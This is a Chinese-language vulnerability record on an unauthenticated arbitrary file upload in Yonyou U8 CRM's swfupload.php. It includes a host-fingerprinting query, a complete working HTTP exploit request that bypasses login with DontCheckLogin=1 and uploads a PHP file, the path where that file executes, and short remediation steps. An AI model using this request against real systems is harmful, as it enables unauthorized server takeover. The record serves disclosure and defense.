---
schema_version: "1"
id: "VW-20261012-CG001"
title: "用友U8 CRM swfupload.php 任意文件上传漏洞"
product: "用友U8 CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "source-claimed"
content_status: "active"
prerequisites: "可访问 /ajax/swfupload.php；无需认证（DontCheckLogin=1）"
side_effects: "任意文件上传可致服务器被控；测试须限定授权环境"
source: "公开 PoC 与安全研究"
source_status: "recorded"
source_url: "https://github.com/gelusus/wxvl/blob/4266b45d974a92de5c1cdd1c440321ebfca53139/doc/2026-10/用友U8 crm客户关系管理swfupload.php存在任意文件上传漏洞.md"
---

# 用友U8 CRM swfupload.php 任意文件上传漏洞

## 漏洞描述

用友U8 CRM客户关系管理系统 `/ajax/swfupload.php` 存在任意文件上传漏洞。攻击者通过 `DontCheckLogin=1` 绕过登录检查，利用文件上传接口上传恶意 PHP 文件，获取服务器权限。

## 网络测绘

```
body="用友U8CRM"
```

## 漏洞复现

![](./.resource/用友U8-CRM-swfupload-任意文件上传漏洞/media/0.png)

![](./.resource/用友U8-CRM-swfupload-任意文件上传漏洞/media/1.png)

```
POST /ajax/swfupload.php?DontCheckLogin=1&vname=file HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------269520967239406871642430066855
Content-Length: 389

-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="file"; filename="shell.php "
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------269520967239406871642430066855
Content-Disposition: form-data; name="upload"

upload
-----------------------------269520967239406871642430066855--
```

![](./.resource/用友U8-CRM-swfupload-任意文件上传漏洞/media/2.png)

上传成功后，文件路径为：

```
http://target/tmpfile/{path}.tmp.php
```

![](./.resource/用友U8-CRM-swfupload-任意文件上传漏洞/media/3.png)

直接访问该路径即可执行上传的 PHP 文件，获取服务器控制权限。

## 漏洞修复

1. 关闭互联网暴露面或对接口设置访问权限；
2. 升级至安全版本，对上传文件类型做严格白名单校验。

> 仅限授权测试。原文中的 `%s.php` 与 `{{path}}` 为原文模板占位符，实际利用时替换为具体文件名。
